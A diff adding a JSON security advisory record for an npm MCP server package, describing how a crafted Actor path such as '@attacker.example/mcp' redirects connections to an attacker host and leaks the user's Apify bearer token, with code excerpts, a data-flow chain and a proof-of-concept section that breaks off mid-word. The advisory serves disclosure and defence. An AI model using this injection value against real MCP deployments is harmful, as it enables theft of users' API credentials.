@@ -1,0 +1,54 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0068",
+  "modified": "2026-09-10T03:51:10.785604703Z",
+  "published": "2026-07-01T22:02:15Z",
+  "aliases": [
+    "GHSA-6gr2-qh89-hxwm",
+    "CVE-2026-50143"
+  ],
+  "summary": "@apify/actors-mcp-server: Apify Model Context Protocol (MCP) server: Actor MCP path authority injection leaks Apify token",
+  "details": "## Actor MCP path authority injection leaks Apify token\n\n### Summary\n\n`@apify/actors-mcp-server` version `0.10.7` builds Actor standby URLs by directly concatenating a trusted base URL with an attacker-controlled `webServerMcpPath` value taken from an Actor definition returned by the Apify API. An attacker who publishes a malicious Actor with a crafted `webServerMcpPath` (e.g., `@attacker.example/mcp`) can cause the MCP client to resolve the final URL to an entirely different host. Because the MCP client unconditionally attaches the victim's `Authorization: Bearer <APIFY_TOKEN>` header to every outbound connection, the victim's Apify API token is exfiltrated to the attacker's server. CVSS Base Score: **8.1 (High)**.\n\n### Details\n\n`getActorMCPServerURL()` in `src/mcp/actors.ts:44` constructs the Actor standby MCP URL by naive string concatenation:\n\n```ts\n// src/mcp/actors.ts:44\nreturn `${standbyUrl}${mcpServerPath}`;\n```\n\n`mcpServerPath` originates from the `webServerMcpPath` field of an Actor definition fetched from the Apify API (`src/utils/actor.ts:24-28`). The field is trimmed and comma-split in `getActorMCPServerPath()` (`src/mcp/actors.ts:14-20`) but is never validated to:\n\n- begin with a `/` (relative path),\n- avoid an `@` character (userinfo/authority injection), or\n- resolve to the same origin as `standbyUrl`.\n\nWhen `webServerMcpPath` is set to `@attacker.example/mcp`, the concatenated result becomes:\n\n```\nhttps://real-actor-id.apify.actor@attacker.example/mcp\n```\n\nNode.js's WHATWG URL parser treats everything before `@` as userinfo and extracts `attacker.example` as the hostname. This is not an edge-case browser behavior — it is specified by RFC 3986 and the WHATWG URL standard.\n\nThe constructed URL is forwarded to `connectMCPClient()` through three independent code paths:\n\n| Call site | Trigger |\n|---|---|\n| `src/tools/core/call_actor_common.ts:317` | `call-actor` MCP tool |\n| `src/utils/actor_details.ts:155` | `fetch-actor-details` MCP tool |\n| `src/mcp/server.ts:1047` | actor-mcp type tool loading |\n\n`connectMCPClient()` (`src/mcp/client.ts`) attaches the victim's Apify token as a bearer credential to every transport type:\n\n```ts\n// src/mcp/client.ts:94  — SSEClientTransport requestInit\nauthorization: `Bearer ${token}`,\n\n// src/mcp/client.ts:103 — SSE fetch callback\nheaders.set('authorization', `Bearer ${token}`);\n\n// src/mcp/client.ts:124 — StreamableHTTPClientTransport requestInit\nauthorization: `Bearer ${token}`,\n```\n\nThere is no origin check anywhere between URL construction and the outbound HTTP request.\n\n**Full data-flow chain:**\n\n1. `src/mcp/server.ts:811` — MCP `tools/call` request parameters are read.\n2. `src/mcp/server.ts:816` — `apifyToken` is resolved from `_meta.apifyToken`, server options, or `process.env.APIFY_TOKEN`.\n3. `src/tools/core/call_actor_common.ts:489-497` — attacker-controlled `actor` identifier is resolved via `getActorMcpUrlCached()`.\n4. `src/utils/actor.ts:24-28` — Actor definition is fetched from the Apify API; `webServerMcpPath` is passed to `getActorMCPServerURL()`.\n5. `src/mcp/actors.ts:14-20` — `webServerMcpPath` is trimmed and split; first element is returned without path validation.\n6. `src/mcp/actors.ts:44` — `standbyUrl + mcpServerPath` produces an authority-injected URL.\n7. `connectMCPClient()` is called with the injected URL and the victim's token.\n8. `src/mcp/client.ts:94/103/124` — `Authorization: Bearer <APIFY_TOKEN>` is sent to the attacker's host.\n\n### PoC\n\n**Environment requirements:**\n\n- Docker (network-isolated container; no external network access needed)\n- The repository at commit `4e2b185` checked out under the build context\n\n**Build and run:**\n\n```bash\n# Build the exploit image (from the mcp_38_apify__actors-mcp-server/ context directory)\ndocker build -t vuln-001-poc \\\n  -f vuln-001/Dockerfile \\\n  /path/to/mcp_38_apify__actors-mcp-server\n\n# Run the exploit (--network none: fully air-gapped)\ndocker run --rm --network none vuln-001-poc\n```\n\nThe Dockerfile:\n1. Genera\n\nImported from OSV GHSA-6gr2-qh89-hxwm.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-6gr2-qh89-hxwm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/apify/apify-mcp-server/security/advisories/GHSA-6gr2-qh89-hxwm"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/apify/apify-mcp-server"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@apify/actors-mcp-server"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.10.11"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "mcp_server",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
